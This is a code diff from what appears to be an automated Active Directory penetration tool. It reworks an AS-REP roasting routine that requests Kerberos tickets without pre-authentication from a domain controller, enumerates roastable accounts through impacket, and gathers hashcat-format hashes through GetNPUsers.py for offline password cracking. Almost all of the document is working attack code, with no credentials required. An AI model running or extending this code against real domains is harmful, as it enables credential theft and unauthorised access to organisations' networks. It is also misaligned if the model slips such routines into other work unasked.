@@ -293,12 +293,17 @@ def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
     """
     Attempt AS-REP roasting against every user in the list.
     Returns a list of hashcat-format hashes for users with pre-auth disabled.
+
+    Implementation note:
+        The impacket Python API (getKerberosTGT) does not expose the raw
+        AS-REP PDU needed to format $krb5asrep$23$ hashes.  This function
+        delegates entirely to asrep_roast_subprocess() which calls
+        GetNPUsers.py — the standard Kali tool that handles hash formatting
+        correctly.  The Python API path is retained only as a fallback to
+        identify roastable users via error codes when GetNPUsers.py is
+        not available.
     """
     hashes: list[str] = []
-
-    if not IMPACKET_AVAILABLE:
-        _log("  AS-REP roast skipped: impacket not available")
-        return hashes
 
     if not users:
         _log("  AS-REP roast skipped: no users to test")
@@ -306,20 +311,31 @@ def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
 
     _log(f"  AS-REP roasting {len(users)} users against {dc_ip} (domain={domain})")
 
+    # ---- Primary path: subprocess via GetNPUsers.py (reliable) ----
+    hashes = asrep_roast_subprocess(dc_ip, domain, users)
+    if hashes:
+        return hashes
+
+    # ---- Fallback: use impacket API to identify roastable users ----
+    # This won't produce formatted hashes, but logs which users have
+    # pre-auth disabled so the operator knows what to target manually.
+    if not IMPACKET_AVAILABLE:
+        _log("  AS-REP roast: neither GetNPUsers.py nor impacket available")
+        return hashes
+
     domain_upper = domain.upper()
+    roastable_users: list[str] = []
 
     for username in users:
         try:
-            # Build the client principal (username only, no realm component here)
             client_name = Principal(
                 username,
                 type=constants.PrincipalNameType.NT_PRINCIPAL.value,
             )
-            # Request AS-REQ without pre-authentication
-            # getKerberosTGT raises KerberosError if pre-auth is required
+            # If getKerberosTGT succeeds with empty password, pre-auth is disabled
             tgt, cipher, old_session_key, session_key = getKerberosTGT(
                 clientName=client_name,
-                password="",           # no password — will trigger pre-auth error
+                password="",
                 domain=domain_upper,
                 lmhash=b"",
                 nthash=b"",
@@ -327,62 +343,28 @@ def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
                 kdcHost=dc_ip,
                 requestPAC=False,
             )
-            # If we get here the user has pre-auth DISABLED — we have a TGT
-            # but we cannot format it as an AS-REP hash from getKerberosTGT's
-            # return value alone; signal success differently.
-            _log(f"    [!] {username}: pre-auth NOT required — TGT obtained (hash unavailable via this API path)")
+            # Success = pre-auth NOT required — user is roastable
+            roastable_users.append(username)
+            _log(f"    [!] {username}: pre-auth NOT required (AS-REP roastable)")
 
         except Exception as exc:
             exc_str = str(exc)
-            # KDC_ERR_PREAUTH_REQUIRED  (25) means normal — user has pre-auth
             if "KDC_ERR_PREAUTH_REQUIRED" in exc_str or "25" in exc_str:
-                continue
-            # KDC_ERR_C_PRINCIPAL_UNKNOWN (6) — user does not exist
+                continue  # Normal — user has pre-auth enabled
             if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in exc_str or "6" in exc_str:
-                continue
-            # eRR_CLIENT_REVOKED (18) — account disabled/locked
+                continue  # User does not exist in the domain
             if "KDC_ERR_CLIENT_REVOKED" in exc_str or "18" in exc_str:
                 _log(f"    {username}: account disabled/locked — skipping")
                 continue
-            # Any other error — log but continue
+            # Unexpected error — log but continue
             _log(f"    {username}: unexpected Kerberos error: {exc_str[:120]}")
             continue
 
-    # -----------------------------------------------------------------------
-    # Fallback: raw AS-REP hash extraction via impacket's internal ASN.1 path
-    # The public getKerberosTGT API does not directly expose the AS-REP PDU
-    # for hash formatting.  Use the lower-level approach that GetNPUsers.py
-    # uses internally (impacket.krb5.kerberosv5.getKerberosTGT with
-    # requestNoPAC flag is sufficient for session acquisition, but the
-    # formatted hash requires parsing the raw AS-REP).  We replicate the
-    # approach here using impacket's ASN.1 objects.
-    # -----------------------------------------------------------------------
-    try:
-        from impacket.krb5.kerberosv5 import sendReceive
-        from impacket.krb5.asn1 import AS_REQ as ASN1_AS_REQ, AS_REP as ASN1_AS_REP
-        from pyasn1.codec.ber import decoder, encoder
-        from impacket.krb5 import constants as krb5constants
-
-        kdc_ip   = dc_ip
-        kdc_port = 88
-
-        for username in users:
-            try:
-                # Build a minimal AS-REQ without PA-ENC-TIMESTAMP
-                client_name = Principal(
-                    username,
-                    type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value,
-                )
-                # impacket helper: build raw AS-REQ bytes
-                from impacket.krb5.kerberosv5 import AS_REQ as build_AS_REQ_func
-                # Actually use the internal builder
-                tgt_req = build_AS_REQ_func()  # type may vary by version
-
-            except Exception:
-                break  # impacket API differs from expected — give up this path
-
-    except ImportError:
-        pass  # pyasn1 or other dep missing — skip
+    if roastable_users:
+        _log(
+            f"  AS-REP roast: {len(roastable_users)} roastable user(s) identified "
+            f"via API but hash formatting requires GetNPUsers.py (not found on PATH)"
+        )
 
     _log(f"  AS-REP roast complete: {len(hashes)} hashes recovered")
     return hashes
@@ -922,14 +904,8 @@ def run() -> dict:
         # --- B: AS-REP Roasting (no credentials needed, port 88 required) ---
         if _port_open(dc, 88):
             if all_users:
-                # Try Python API first
-                api_hashes = asrep_roast(dc_ip, domain, all_users)
-                if api_hashes:
-                    all_asrep_hashes.extend(h for h in api_hashes if h not in all_asrep_hashes)
-                else:
-                    # Fall back to subprocess (GetNPUsers.py on Kali)
-                    sub_hashes = asrep_roast_subprocess(dc_ip, domain, all_users)
-                    all_asrep_hashes.extend(h for h in sub_hashes if h not in all_asrep_hashes)
+                asrep_hashes = asrep_roast(dc_ip, domain, all_users)
+                all_asrep_hashes.extend(h for h in asrep_hashes if h not in all_asrep_hashes)
             else:
                 _log("  No users enumerated — skipping AS-REP roast")
         else:
